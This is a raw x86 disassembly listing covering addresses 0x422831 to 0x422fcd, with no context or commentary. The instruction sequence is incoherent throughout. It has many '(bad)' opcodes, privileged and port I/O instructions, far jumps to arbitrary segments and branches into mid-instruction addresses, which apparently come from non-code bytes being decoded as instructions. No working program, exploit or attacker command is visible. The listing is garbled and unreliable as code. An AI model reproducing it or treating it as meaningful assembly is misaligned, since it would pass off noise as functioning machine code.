  422831:	pop    edx
  422832:	dec    edx
  422833:	test   eax,0xfe6828c9
  422838:	push   ebx
  422839:	call   0xeebd:0xc802c552
  422840:	mov    ?,WORD PTR [edi-0x59]
  422843:	out    0x1,al
  422845:	or     eax,0x1ad66099
  42284a:	xor    dh,BYTE PTR [eax-0x1a]
  42284d:	sub    esp,edx
  42284f:	and    eax,0xa926fba3
  422854:	or     eax,0xa4eaa521
  422859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42285a:	xor    BYTE PTR [ebp-0x42],dl
  42285d:	pushf  
  42285e:	fbld   TBYTE PTR [ebx-0x2a]
  422861:	xchg   edi,eax
  422862:	push   cs
  422863:	mov    dh,0x93
  422865:	int3   
  422866:	scas   eax,DWORD PTR es:[edi]
  422867:	lea    esp,[esi]
  422869:	shl    BYTE PTR ds:0x9fd993e8,cl
  42286f:	inc    esi
  422870:	push   ebp
  422871:	cmp    BYTE PTR [ebx+0xd9cf04f],ch
  422877:	sub    ecx,ebx
  422879:	fld    TBYTE PTR [edi+0x5754b8f3]
  42287f:	mov    ecx,DWORD PTR [esi+esi*1]
  422882:	inc    ebp
  422883:	pop    ebp
  422884:	dec    edx
  422885:	stos   BYTE PTR es:[edi],al
  422886:	push   esi
  422887:	inc    esi
  422888:	pop    ss
  422889:	shr    DWORD PTR [eax*1+0x7925ae52],0x4d
  422891:	iretw  
  422893:	arpl   bx,sp
  422895:	in     eax,dx
  422896:	mov    bh,0xf2
  422898:	mov    ah,0x1d
  42289a:	adc    al,0xdc
  42289c:	mov    dl,0x39
  42289e:	pop    ebx
  42289f:	lock cmp eax,0x1c638004
  4228a5:	mov    ds:0x43962359,al
  4228aa:	xor    BYTE PTR [ebp-0xfa5f30a],ch
  4228b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228b1:	rcr    DWORD PTR [edx],1
  4228b3:	mov    esi,0x3381c6c7
  4228b8:	fdiv   DWORD PTR [ecx]
  4228ba:	shl    BYTE PTR [edi-0x2609026a],0x89
  4228c1:	es cwde 
  4228c3:	jecxz  0x422858
  4228c5:	test   BYTE PTR gs:[edx-0x135a1303],dl
  4228cc:	loopne 0x422916
  4228ce:	or     ebx,DWORD PTR [esi+0x25]
  4228d1:	inc    ebp
  4228d2:	test   al,0xab
  4228d4:	cs xor al,bh
  4228d7:	jg     0x4228a0
  4228d9:	cmp    BYTE PTR ds:0xecc1c5f4,bl
  4228df:	call   ecx
  4228e1:	cmp    al,0x2d
  4228e3:	pop    ebp
  4228e4:	fsub   DWORD PTR [ecx]
  4228e6:	scas   eax,DWORD PTR es:[edi]
  4228e7:	pop    es
  4228e8:	hlt    
  4228e9:	cli    
  4228ea:	xor    ebp,DWORD PTR [ebp+ebx*8+0x7fa0b17d]
  4228f1:	mov    ecx,ds
  4228f3:	imul   ecx,edi,0x69
  4228f6:	mov    edi,0xf09473ec
  4228fb:	stos   BYTE PTR es:[edi],al
  4228fc:	inc    esp
  4228fd:	xchg   ebp,eax
  4228fe:	or     al,cl
  422900:	cdq    
  422901:	or     DWORD PTR [eax],0xb7cc91fb
  422907:	imul   ebx,DWORD PTR [edx+0x3f7cd561],0x6
  42290e:	push   edi
  42290f:	in     eax,0xd3
  422911:	push   ecx
  422912:	push   ebx
  422913:	sub    bh,BYTE PTR [ebx]
  422915:	or     al,0xf2
  422917:	cmp    eax,ebp
  422919:	or     DWORD PTR ds:0x5a32fd47,ebp
  42291f:	inc    edx
  422920:	mov    eax,0xc18560cc
  422925:	push   esi
  422926:	mov    al,0xd0
  422928:	fcom   QWORD PTR [ecx+0x24d6b82a]
  42292e:	out    dx,eax
  42292f:	dec    esi
  422930:	mov    ecx,0x9144823
  422935:	xor    al,BYTE PTR [ebp+edx*2+0x7d]
  422939:	push   esp
  42293a:	push   cs
  42293b:	retf   
  42293c:	mov    ch,0xc9
  42293e:	ja     0x422996
  422940:	push   ecx
  422941:	jecxz  0x4228ec
  422943:	out    dx,eax
  422944:	pop    esp
  422945:	adc    cl,dh
  422947:	inc    esp
  422948:	icebp  
  422949:	rcl    BYTE PTR [ebx+edi*1-0x46],1
  42294d:	(bad)  
  42294e:	fstp   QWORD PTR [ebp+0x5c]
  422951:	scas   eax,DWORD PTR es:[edi]
  422952:	mov    eax,ds:0x99242b90
  422957:	add    eax,0xd1c6cef5
  42295c:	pop    eax
  42295d:	(bad)  [edx-0x71]
  422960:	neg    DWORD PTR [ebx+ecx*4]
  422963:	sbb    edi,DWORD PTR [edx+0xc]
  422966:	imul   ebp,DWORD PTR [edx-0x34],0xffffff95
  42296a:	mov    esi,0x4fa6d5e5
  42296f:	xor    al,ah
  422971:	and    eax,0x49e99c3
  422976:	out    dx,al
  422977:	and    eax,0x7b537bed
  42297c:	add    al,0x11
  42297f:	xor    eax,0x7289da0b
  422984:	push   ds
  422985:	and    ebx,ebx
  422987:	pop    es
  422988:	fnstcw WORD PTR [edi-0x56]
  42298b:	add    eax,0xda2a775
  422990:	(bad)  
  422991:	mov    WORD PTR ss:[edx-0x63],?
  422995:	mov    eax,ds:0x1ac187a
  42299a:	iret   
  42299b:	mov    dh,0xe0
  42299d:	mov    BYTE PTR [ebx],dl
  42299f:	icebp  
  4229a0:	mov    eax,ds:0xa141a74
  4229a5:	dec    edx
  4229a6:	imul   ebx,esp,0xf3413ac5
  4229ac:	test   DWORD PTR [ebx-0x64],ebp
  4229af:	ficomp WORD PTR [eax]
  4229b1:	jle    0x42295c
  4229b3:	xor    ebp,ecx
  4229b5:	or     ebp,DWORD PTR [ecx]
  4229b7:	sar    DWORD PTR [ebx-0x66],1
  4229ba:	lds    ebp,FWORD PTR [edi+edx*1]
  4229bd:	fs cwde 
  4229bf:	mov    WORD PTR [ecx+0x69204785],gs
  4229c5:	push   edx
  4229c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229c7:	push   edx
  4229c8:	mov    ecx,0x29bb9221
  4229cd:	cmp    esp,DWORD PTR [ecx]
  4229cf:	mov    eax,0x3f54ae32
  4229d4:	mov    al,0x83
  4229d6:	push   edx
  4229d7:	jg     0x4229c9
  4229d9:	inc    edx
  4229da:	xor    DWORD PTR [edx],eax
  4229dc:	retf   0x72f7
  4229df:	inc    ebp
  4229e0:	lods   eax,DWORD PTR ds:[esi]
  4229e1:	mov    cl,0xbd
  4229e3:	sbb    BYTE PTR [eax+0x3717502b],al
  4229e9:	push   esp
  4229ea:	daa    
  4229eb:	cmp    bl,dh
  4229ed:	sub    al,0x4f
  4229ef:	pop    es
  4229f0:	inc    esp
  4229f1:	sub    al,0x56
  4229f3:	into   
  4229f4:	xchg   ebx,eax
  4229f5:	out    0x21,al
  4229f7:	pop    edi
  4229f8:	mov    bl,0x79
  4229fa:	mov    WORD PTR gs:[ebp+0x2ca6f199],gs
  422a01:	iret   
  422a02:	sub    bl,BYTE PTR [ecx]
  422a04:	mov    dl,0x8
  422a06:	add    ebp,DWORD PTR [esi]
  422a08:	mov    ds:0x92ef4f82,eax
  422a0d:	loopne 0x422a2f
  422a0f:	cwde   
  422a10:	lock xchg ebp,eax
  422a12:	xchg   edi,eax
  422a13:	call   0x812d4549
  422a18:	ja     0x422a5e
  422a1a:	sub    ebp,DWORD PTR [ebx+0x23]
  422a1d:	mov    ebp,0x2283b2ae
  422a22:	add    DWORD PTR cs:[eax-0x653b1765],0xffffff8d
  422a2a:	and    DWORD PTR [ebx],ecx
  422a2c:	stos   DWORD PTR es:[edi],eax
  422a2d:	mov    bl,0x50
  422a2f:	inc    ebp
  422a30:	cmp    esp,DWORD PTR [edi+0x5e]
  422a33:	stos   DWORD PTR es:[edi],eax
  422a34:	cdq    
  422a35:	stos   BYTE PTR es:[edi],al
  422a36:	sbb    eax,ecx
  422a38:	sbb    DWORD PTR [edx+0x7b],eax
  422a3b:	mov    al,ds:0x7b35991a
  422a40:	inc    ebp
  422a41:	mov    esp,0xfab50c78
  422a46:	not    DWORD PTR [edi]
  422a48:	fs int3 
  422a4a:	mov    WORD PTR [ebp-0x26],ds
  422a4d:	and    eax,0x73fa41b2
  422a52:	loope  0x422a73
  422a54:	addr16 inc edx
  422a56:	nop
  422a57:	xchg   BYTE PTR [eax],dl
  422a59:	cmp    al,0xae
  422a5b:	pop    ebp
  422a5c:	xor    ebx,esi
  422a5e:	int3   
  422a5f:	mov    WORD PTR [edx-0x46],gs
  422a62:	imul   esp,DWORD PTR cs:[ebx],0x2d
  422a66:	jo     0x422a2e
  422a68:	or     dh,cl
  422a6a:	cli    
  422a6b:	(bad)  
  422a6c:	mul    BYTE PTR [eax+0x55]
  422a6f:	mov    eax,ds:0x5becf7a6
  422a74:	(bad)
  422a77:	or     eax,0x53335e6
  422a7c:	cmp    dh,BYTE PTR [esi+0x37]
  422a7f:	inc    esp
  422a80:	stos   BYTE PTR es:[edi],al
  422a81:	and    eax,DWORD PTR [edx-0x30]
  422a84:	push   eax
  422a85:	add    BYTE PTR [eax+eax*8-0x2ba9afcd],ah
  422a8c:	retf   
  422a8d:	jg     0x422a4d
  422a8f:	cmovl  ebp,DWORD PTR [esi]
  422a92:	sub    esi,0x483a8a7d
  422a98:	sub    bh,ch
  422a9a:	sub    DWORD PTR [ecx-0x7f],0x4d0ac851
  422aa1:	mov    edi,esi
  422aa3:	lods   eax,DWORD PTR ds:[esi]
  422aa4:	xor    BYTE PTR [ebp-0x44],0xfa
  422aa8:	and    al,al
  422aaa:	call   0x58f6:0xc909c653
  422ab1:	outs   dx,BYTE PTR ds:[esi]
  422ab2:	adc    al,BYTE PTR [eax-0x3e]
  422ab5:	jne    0x422b01
  422ab7:	jns    0x422af1
  422ab9:	pop    ss
  422aba:	add    DWORD PTR ds:0xbb457cdb,eax
  422ac0:	mov    ch,0x33
  422ac2:	or     ecx,eax
  422ac4:	dec    ebx
  422ac5:	jecxz  0x422b28
  422ac7:	and    ecx,DWORD PTR [eax+0x51752ca1]
  422acd:	(bad)  
  422ace:	jg     0x422a94
  422ad0:	aad    0xf
  422ad2:	adc    ch,BYTE PTR [ebp+0x30]
  422ad5:	and    al,0x6e
  422ad7:	popf   
  422ad8:	in     eax,0x36
  422ada:	sbb    eax,0x86e3c3e8
  422adf:	popf   
  422ae0:	outs   dx,DWORD PTR ds:[esi]
  422ae1:	imul   edi,DWORD PTR [ecx],0xee013194
  422ae7:	enter  0x26e3,0xc1
  422aeb:	push   ebp
  422aec:	and    cl,ah
  422aee:	daa    
  422aef:	xchg   ebp,eax
  422af0:	jne    0x422b38
  422af2:	(bad)  
  422af3:	or     DWORD PTR [ecx],ecx
  422af5:	into   
  422af6:	pop    ecx
  422af7:	dec    ebp
  422af8:	mov    ebx,0xe500f3f7
  422afd:	shl    BYTE PTR [edi+esi*8],1
  422b00:	dec    esi
  422b01:	adc    eax,0x1a7db509
  422b06:	arpl   WORD PTR [eax-0x6e7fc4e2],cx
  422b0c:	fwait
  422b0d:	or     al,0xbd
  422b0f:	cmc    
  422b10:	ss out dx,eax
  422b12:	mov    al,ds:0xf90fc65
  422b17:	into   
  422b18:	cmp    edi,0xd6401d71
  422b1e:	mov    ebp,edi
  422b20:	xor    bl,cl
  422b22:	sbb    edx,ebx
  422b24:	aam    0xe7
  422b26:	scas   eax,DWORD PTR es:[edi]
  422b27:	cmc    
  422b28:	sar    ah,0xc1
  422b2b:	imul   eax,DWORD PTR cs:[esi-0x149c957e],0xffffff81
  422b33:	and    al,0xe7
  422b35:	pop    ecx
  422b36:	std    
  422b37:	sub    edx,DWORD PTR [eax]
  422b39:	jne    0x422b1a
  422b3b:	push   ebx
  422b3c:	xchg   ebp,eax
  422b3d:	(bad)  
  422b3f:	gs mov edi,0xb8140c91
  422b45:	sbb    bh,BYTE PTR [edx+ecx*4-0x14]
  422b49:	pop    eax
  422b4a:	or     BYTE PTR [edi],dl
  422b4c:	jbe    0x422ae0
  422b4e:	popf   
  422b4f:	inc    esp
  422b50:	out    dx,al
  422b51:	jbe    0x422b67
  422b53:	nop
  422b54:	mov    esi,0xd0f1a03d
  422b59:	jp     0x422ae7
  422b5b:	mov    dh,0x48
  422b5d:	test   al,0xa4
  422b5f:	jge    0x422b71
  422b61:	sbb    eax,0x48357d0e
  422b66:	and    al,0x2b
  422b68:	fcomp  DWORD PTR [edi]
  422b6a:	mov    WORD PTR fs:[eax-0x7],fs
  422b6e:	fxsave [ecx+0x606e13f4]
  422b75:	cmp    edx,DWORD PTR [ebp-0x78898994]
  422b7b:	inc    esi
  422b7c:	add    edx,ebx
  422b7e:	sti    
  422b7f:	xor    al,0x37
  422b81:	dec    ebx
  422b82:	bound  eax,QWORD PTR [ecx]
  422b84:	mov    bl,0x41
  422b86:	shl    BYTE PTR [edx+0x6e],1
  422b89:	fdiv   DWORD PTR ds:0xfc198e0f
  422b8f:	jne    0x422b14
  422b91:	popa   
  422b92:	gs pop ecx
  422b94:	push   ds
  422b95:	cwde   
  422b96:	cli    
  422b97:	in     eax,0x5e
  422b99:	jbe    0x422bfd
  422b9b:	loop   0x422be9
  422b9d:	je     0x422bb7
  422b9f:	jp     0x422b4f
  422ba1:	idiv   BYTE PTR [ecx]
  422ba3:	jg     0x422bf5
  422ba5:	(bad)  
  422ba6:	int    0x4e
  422ba8:	add    dl,BYTE PTR [ebp-0x51]
  422bab:	inc    edi
  422bac:	pushf  
  422bad:	lods   eax,DWORD PTR ds:[esi]
  422bae:	jp     0x422b5e
  422bb0:	(bad)  
  422bb1:	mov    eax,0x6b378614
  422bb6:	mov    BYTE PTR [ebx-0x2e83ac8],cl
  422bbc:	mov    cl,dl
  422bbe:	or     dh,0x7d
  422bc1:	in     eax,0x78
  422bc3:	xchg   esp,eax
  422bc4:	pusha  
  422bc5:	mov    ?,esi
  422bc7:	(bad)  
  422bc8:	repz mov eax,ds:0x7c1fb6
  422bce:	jb     0x422bde
  422bd0:	push   eax
  422bd1:	push   0xffffffd0
  422bd3:	repz inc si
  422bd6:	or     al,0xf0
  422bd8:	xchg   ecx,eax
  422bd9:	ret    0x28b2
  422bdc:	inc    edx
  422bdd:	or     eax,0x8a202870
  422be2:	clc    
  422be3:	adc    dh,bl
  422be5:	pop    ebp
  422be6:	imul   edx,DWORD PTR [ecx],0xc5ce56e1
  422bec:	jo     0x422bef
  422bee:	aad    0x62
  422bf0:	iret   
  422bf1:	icebp  
  422bf2:	sahf   
  422bf3:	pop    edx
  422bf4:	out    dx,eax
  422bf5:	(bad)  [edx]
  422bf7:	pusha  
  422bf8:	or     ebx,DWORD PTR [eax]
  422bfa:	pop    ebx
  422bfb:	inc    edx
  422bfc:	das    
  422bfd:	or     edi,esp
  422bff:	stc    
  422c00:	adc    bl,BYTE PTR [esi+0x202795ac]
  422c06:	sbb    esi,DWORD PTR [ecx]
  422c08:	ins    BYTE PTR es:[edi],dx
  422c09:	jl     0x422c39
  422c0b:	je     0x422c84
  422c0d:	cs push es
  422c0f:	jge    0x422be0
  422c11:	mov    bh,0x49
  422c13:	mov    ebx,0xb7f888bf
  422c18:	mov    bh,0x5d
  422c1a:	jno    0x422c36
  422c1c:	dec    edx
  422c1d:	aam    0xf
  422c1f:	ds out dx,al
  422c21:	fnsave [eax-0xb]
  422c24:	(bad)  
  422c25:	mov    esp,0xf7b84571
  422c2a:	aaa    
  422c2b:	xor    ebx,DWORD PTR ds:[edi+esi*4-0x6bbc86b6]
  422c33:	xor    esp,ecx
  422c35:	pop    ebx
  422c36:	jbe    0x422c42
  422c38:	sub    bl,0x80
  422c3b:	cmp    bl,BYTE PTR ds:[edi-0x44]
  422c3f:	jmp    0x422cba
  422c41:	dec    eax
  422c42:	sbb    al,0xd6
  422c44:	outs   dx,BYTE PTR ds:[esi]
  422c45:	ror    DWORD PTR [ecx+0x15b28fd8],1
  422c4b:	ret    0xf311
  422c4e:	mov    ebp,0xe8d31177
  422c53:	les    ebx,FWORD PTR [ecx+0x6935b4c9]
  422c59:	jb     0x422c62
  422c5b:	repz jb 0x422c48
  422c5e:	push   edx
  422c5f:	dec    ecx
  422c60:	xchg   edx,eax
  422c61:	jnp    0x422ca2
  422c63:	aam    0x82
  422c65:	mov    esp,0x3d65670c
  422c6a:	xchg   ebp,eax
  422c6b:	loope  0x422c0e
  422c6d:	dec    edx
  422c6e:	or     ecx,edx
  422c70:	mov    esi,0x22e751a1
  422c75:	pop    edx
  422c76:	jns    0x422c96
  422c78:	and    DWORD PTR [ebp-0x293e90d4],0x22
  422c7f:	(bad)  [ecx+0x43fa7b7a]
  422c85:	mov    al,ds:0xc96b155d
  422c8a:	jne    0x422c0f
  422c8c:	adc    BYTE PTR [esi],bh
  422c8e:	inc    ecx
  422c8f:	adc    BYTE PTR [esi*4+0x19f146d5],al
  422c96:	test   DWORD PTR [ecx+0xb],ebx
  422c99:	dec    ebp
  422c9a:	sbb    eax,0xbe4dfe20
  422c9f:	ret    0x39ef
  422ca2:	mov    ecx,0xf19200e3
  422ca7:	xchg   DWORD PTR [ebx+0x72fb8fcd],ecx
  422cad:	(bad)  
  422cae:	cld    
  422caf:	test   eax,0x8263a9ad
  422cb4:	cmp    DWORD PTR [ebp-0x1e5d1dab],0x8
  422cbb:	ficom  WORD PTR [edi]
  422cbd:	into   
  422cbe:	(bad)  
  422cbf:	xchg   ecx,eax
  422cc0:	outs   dx,BYTE PTR ds:[esi]
  422cc1:	jmp    0x6c318411
  422cc6:	sbb    al,0x9a
  422cc8:	mov    eax,?
  422cca:	mov    edi,0xd16c9c29
  422ccf:	lods   eax,DWORD PTR ds:[esi]
  422cd0:	push   0x63014e5a
  422cd5:	shl    DWORD PTR [esp+edi*1-0x578b6dcc],0x33
  422cdd:	lods   al,BYTE PTR ds:[esi]
  422cde:	mov    al,0x67
  422ce0:	pop    ebx
  422ce1:	xchg   BYTE PTR [ebx],cl
  422ce3:	sbb    DWORD PTR [ecx],eax
  422ce5:	or     BYTE PTR [eax-0x1eb0a560],cl
  422ceb:	shr    DWORD PTR [esi-0x5],0x90
  422cef:	stos   BYTE PTR es:[edi],al
  422cf0:	and    ah,0xc8
  422cf3:	cmp    eax,0x8d64bf1c
  422cf8:	jl     0x422cd2
  422cfa:	rep stos DWORD PTR es:[edi],eax
  422cfc:	mov    al,ds:0x3402db6d
  422d01:	xor    bl,al
  422d03:	inc    edi
  422d04:	out    0x7c,al
  422d06:	mov    esi,0xdd007e5f
  422d0b:	push   edx
  422d0c:	sbb    dl,dh
  422d0e:	xchg   ebx,eax
  422d0f:	(bad)  
  422d10:	call   edi
  422d12:	(bad)  
  422d13:	retf   0xda9e
  422d16:	into   
  422d17:	arpl   WORD PTR [edx],bp
  422d19:	add    dh,BYTE PTR [edx]
  422d1b:	cmc    
  422d1c:	pop    es
  422d1d:	pop    ss
  422d1e:	cmp    eax,0x7ea999
  422d23:	test   al,0x88
  422d25:	pushf  
  422d26:	pop    ebx
  422d27:	dec    ecx
  422d28:	add    al,0x16
  422d2a:	jmp    0x9ec8:0x11ae90c5
  422d31:	enter  0x9a31,0x9e
  422d35:	stos   BYTE PTR es:[edi],al
  422d36:	jb     0x422cc4
  422d38:	jg     0x422d07
  422d3a:	inc    ebp
  422d3b:	sbb    bh,cl
  422d3d:	add    DWORD PTR [edx-0x38],eax
  422d40:	shl    ebx,0x45
  422d43:	lock pop ebx
  422d45:	push   0xff4c4b56
  422d4a:	adc    al,0x25
  422d4c:	xor    DWORD PTR [edi-0x2628529],ecx
  422d52:	mov    eax,0xaaf2933c
  422d57:	xchg   esp,eax
  422d58:	shr    BYTE PTR [eax],0x6a
  422d5b:	pop    ebp
  422d5c:	or     eax,0x5a82af56
  422d61:	mov    al,ds:0x42a67c3a
  422d66:	jns    0x422d96
  422d68:	jecxz  0x422d72
  422d6a:	mov    eax,ds:0x84d8a5e
  422d6f:	add    DWORD PTR [edi+ebx*1],edi
  422d72:	(bad)  
  422d73:	loopne 0x422d86
  422d75:	cmp    BYTE PTR [ebp+edx*4-0x8570428],ah
  422d7c:	scas   al,BYTE PTR es:[edi]
  422d7d:	cmp    DWORD PTR [edx-0x1e300404],esi
  422d83:	sub    ecx,edi
  422d85:	popf   
  422d86:	dec    edi
  422d87:	jmp    0x1868:0x571b1a15
  422d8e:	cdq    
  422d8f:	dec    ebp
  422d90:	stos   DWORD PTR es:[edi],eax
  422d91:	in     al,0xa2
  422d93:	adc    bh,BYTE PTR [ebp-0x20cb2d2d]
  422d99:	dec    ebx
  422d9a:	or     BYTE PTR [ebx-0x57acddc4],ch
  422da0:	pop    edx
  422da1:	and    dl,BYTE PTR [ebp+0x14]
  422da4:	pop    es
  422da5:	inc    ebp
  422da6:	fwait
  422da7:	dec    esi
  422da8:	sub    ebx,DWORD PTR [eax]
  422daa:	inc    ecx
  422dab:	hlt    
  422dac:	inc    edi
  422dad:	mov    bh,0x7b
  422daf:	lea    edi,[ecx+0x25]
  422db2:	int    0x25
  422db4:	inc    ax
  422db6:	leave  
  422db7:	in     al,dx
  422db8:	cli    
  422db9:	xor    DWORD PTR [edx+edx*1],0x17
  422dbd:	aas    
  422dbe:	and    DWORD PTR [esp+ebx*2+0x5e],ebp
  422dc2:	(bad)  
  422dc3:	out    dx,eax
  422dc4:	sub    BYTE PTR [esi+0x669f3c2c],al
  422dca:	mov    edx,0x9923dcc6
  422dcf:	stc    
  422dd0:	sub    al,0xbf
  422dd2:	push   ss
  422dd3:	in     eax,0xd4
  422dd5:	pusha  
  422dd6:	xchg   edi,eax
  422dd7:	inc    esp
  422dd8:	and    ah,ch
  422dda:	xor    ah,bl
  422ddc:	mov    al,0x5
  422dde:	jge    0x422e12
  422de0:	ret    0x46ad
  422de3:	lods   eax,DWORD PTR ds:[esi]
  422de4:	lods   al,BYTE PTR ds:[esi]
  422de5:	jecxz  0x422dd0
  422de7:	fcmove st,st(2)
  422de9:	cmp    cl,cl
  422deb:	(bad)  
  422dec:	cmp    eax,0x628fc7a8
  422df1:	mov    dl,0xb7
  422df3:	xlat   BYTE PTR ds:[ebx]
  422df4:	jnp    0x422e11
  422df6:	pop    es
  422df7:	lock out 0x1e,al
  422dfa:	and    BYTE PTR [ebx-0x6c],0x81
  422dfe:	neg    DWORD PTR [esp+edi*2+0x3b]
  422e02:	mov    WORD PTR [edi-0x2f0a9a18],gs
  422e08:	mov    ebx,0xe65d3dd2
  422e0d:	loopne 0x422e4e
  422e0f:	ret    0x6ef7
  422e12:	xor    BYTE PTR [eax-0x2],bl
  422e15:	xor    DWORD PTR [esi-0x252d8c6],eax
  422e1b:	aam    0x33
  422e1d:	arpl   WORD PTR [eax],di
  422e1f:	adc    edi,edx
  422e21:	(bad)  
  422e22:	loope  0x422e8b
  422e24:	jne    0x422ddf
  422e26:	neg    al
  422e28:	push   ss
  422e29:	mov    cs,WORD PTR [eax-0x2810b7ac]
  422e2f:	fwait
  422e30:	dec    edi
  422e31:	pop    edx
  422e32:	out    dx,eax
  422e33:	sbb    BYTE PTR [edi-0x69],cl
  422e36:	sahf   
  422e37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e38:	retf   
  422e39:	aam    0x4b
  422e3b:	add    esi,edx
  422e3d:	aas    
  422e3e:	test   BYTE PTR [edx+0x35],al
  422e41:	mov    DWORD PTR [ebp+0x6e],edx
  422e44:	sub    DWORD PTR [edx+0x29c6fb87],ebx
  422e4a:	sbb    bl,BYTE PTR [esi-0xc]
  422e4d:	adc    BYTE PTR [ecx+ecx*4+0x5c],bh
  422e51:	pushf  
  422e52:	icebp  
  422e53:	xor    al,0x57
  422e55:	adc    BYTE PTR [ecx+0x4f],ch
  422e58:	jecxz  0x422e3a
  422e5a:	test   BYTE PTR [eax],cl
  422e5c:	push   ebx
  422e5d:	push   ebx
  422e5e:	pop    ebx
  422e5f:	jns    0x422e5f
  422e61:	shl    DWORD PTR [ebp+0x1ccb803a],cl
  422e67:	aad    0xd
  422e69:	out    dx,eax
  422e6a:	outs   dx,DWORD PTR ds:[esi]
  422e6b:	ret    0xf086
  422e6e:	pop    edx
  422e6f:	test   al,0x44
  422e71:	aaa    
  422e72:	jne    0x422e77
  422e74:	int    0xe1
  422e76:	sbb    ah,cl
  422e78:	fs jb  0x422ecb
  422e7b:	or     al,0xa0
  422e7d:	lods   al,BYTE PTR ds:[esi]
  422e7e:	pop    esp
  422e7f:	cmc    
  422e80:	cmp    esi,DWORD PTR [ecx-0x3ccc1577]
  422e86:	gs retf 0xb921
  422e8a:	xlat   BYTE PTR ds:[ebx]
  422e8b:	imul   eax,DWORD PTR [edi+0x3b],0xffffff82
  422e8f:	or     eax,0xb3834f9f
  422e94:	push   edx
  422e95:	pop    esi
  422e96:	mov    eax,ebp
  422e98:	or     DWORD PTR [ecx+esi*8+0x4296d857],esp
  422e9f:	sar    esi,1
  422ea1:	cwde   
  422ea2:	sbb    DWORD PTR [esi],0xffffffe0
  422ea5:	cmp    al,0x33
  422ea7:	sub    eax,0x732cf6e7
  422eac:	pop    ss
  422ead:	dec    edx
  422eae:	stc    
  422eaf:	xor    BYTE PTR [edx],al
  422eb1:	(bad)  
  422eb2:	adc    eax,0xe901c3f8
  422eb7:	shr    ah,cl
  422eb9:	jns    0x422e62
  422ebb:	xor    BYTE PTR [esi-0x1d922b53],cl
  422ec1:	sub    ah,BYTE PTR [ebx]
  422ec3:	cmc    
  422ec4:	xchg   DWORD PTR [edx+0xec103ac],esp
  422eca:	fs and al,al
  422ecd:	ror    BYTE PTR [ecx-0x766e2ead],0x7c
  422ed4:	and    esp,edx
  422ed6:	sar    ecx,cl
  422ed8:	(bad)  
  422ed9:	call   0x5d990bb4
  422ede:	or     al,0x8
  422ee0:	test   DWORD PTR [ebp+0x27],edi
  422ee3:	das    
  422ee4:	sbb    al,BYTE PTR ds:0x86cc0682
  422eea:	out    0x29,eax
  422eec:	and    eax,DWORD PTR [edx]
  422eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eef:	pop    edi
  422ef0:	shr    eax,cl
  422ef2:	iret   
  422ef3:	sbb    eax,DWORD PTR [ecx+0x32]
  422ef6:	dec    eax
  422ef7:	stos   DWORD PTR es:[edi],eax
  422ef8:	push   ebp
  422ef9:	icebp  
  422efa:	adc    esp,DWORD PTR gs:[ebx]
  422efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422efe:	scas   al,BYTE PTR es:[edi]
  422eff:	lock or al,0x66
  422f02:	ss pop ecx
  422f04:	ins    BYTE PTR es:[edi],dx
  422f05:	push   edx
  422f06:	in     eax,0xc2
  422f08:	es dec ebp
  422f0a:	push   ebp
  422f0b:	cld    
  422f0c:	stos   DWORD PTR es:[edi],eax
  422f0d:	cmp    dh,BYTE PTR [ebx+0x72]
  422f10:	jecxz  0x422f50
  422f12:	fs or  esp,esi
  422f15:	mov    ds:0x9a5288ba,eax
  422f1a:	retf   
  422f1b:	repz imul eax,DWORD PTR [ecx-0x19],0x3a
  422f20:	mov    dl,0x23
  422f22:	adc    BYTE PTR [edx],dl
  422f24:	cli    
  422f25:	jns    0x422ec5
  422f27:	xor    cl,dl
  422f29:	pop    esi
  422f2a:	jo     0x422f1c
  422f2c:	push   edx
  422f2d:	out    0xcb,eax
  422f2f:	sub    al,0x65
  422f31:	jge    0x422f61
  422f33:	pop    es
  422f34:	add    eax,0x29a9b309
  422f39:	loope  0x422ef2
  422f3b:	mov    ch,0xc1
  422f3d:	popa   
  422f3e:	leave  
  422f3f:	fcmove st,st(2)
  422f41:	push   ecx
  422f42:	sbb    al,0x4
  422f44:	mov    ebx,esi
  422f46:	bound  edi,QWORD PTR [edi]
  422f48:	out    dx,al
  422f49:	xor    al,0xd4
  422f4b:	(bad)  
  422f4c:	lock lods al,BYTE PTR ds:[esi]
  422f4e:	(bad)  
  422f4f:	aad    0x56
  422f51:	sub    al,0xec
  422f53:	repz fwait
  422f55:	adc    DWORD PTR [edi-0x49],0x11
  422f59:	mov    bl,0xef
  422f5b:	dec    esp
  422f5c:	sub    al,0x39
  422f5e:	out    dx,al
  422f5f:	in     eax,dx
  422f60:	and    DWORD PTR [eax],ebx
  422f62:	xchg   BYTE PTR [ebx],ah
  422f64:	mov    dl,0x4f
  422f66:	sub    al,0xb6
  422f68:	cli    
  422f69:	repnz (bad) 
  422f6b:	rol    ecx,cl
  422f6d:	ds push ebx
  422f6f:	test   eax,0x5bec5df7
  422f74:	cs sub eax,0x8918771a
  422f7a:	cld    
  422f7b:	repnz test cl,0xb2
  422f7f:	push   ds
  422f80:	xchg   DWORD PTR gs:[ebx-0x846b413],esp
  422f87:	jbe    0x422fb7
  422f89:	dec    edi
  422f8a:	xchg   DWORD PTR [ecx+esi*2+0x5f],eax
  422f8e:	push   es
  422f8f:	dec    ebx
  422f90:	add    eax,0x23f34578
  422f95:	sysexit 
  422f97:	mov    esi,0x511b852b
  422f9c:	mov    esi,DWORD PTR [edx+0x40]
  422f9f:	ror    BYTE PTR [ecx],0x3f
  422fa2:	sbb    bl,al
  422fa4:	cdq    
  422fa5:	sbb    dl,BYTE PTR [ebx-0x1c]
  422fa8:	clc    
  422fa9:	jp     0x422f45
  422fab:	loope  0x422ff5
  422fad:	xchg   edx,eax
  422fae:	inc    ecx
  422faf:	ret    
  422fb0:	leave  
  422fb1:	jmp    0x12e0:0xba431b39
  422fb8:	in     eax,dx
  422fb9:	xchg   esi,eax
  422fba:	mov    dl,0xc2
  422fbc:	cli    
  422fbd:	sahf   
  422fbe:	ja     0x422ffa
  422fc0:	lods   al,BYTE PTR ds:[esi]
  422fc1:	push   ecx
  422fc2:	lea    ebx,[ebx]
  422fc4:	scas   eax,DWORD PTR es:[edi]
  422fc5:	jle    0x422fdd
  422fc7:	xor    ecx,esp
  422fc9:	or     esp,ecx
  422fcb:	jne    0x422fe9
  422fcd:	sub    eax,0x755b8e11
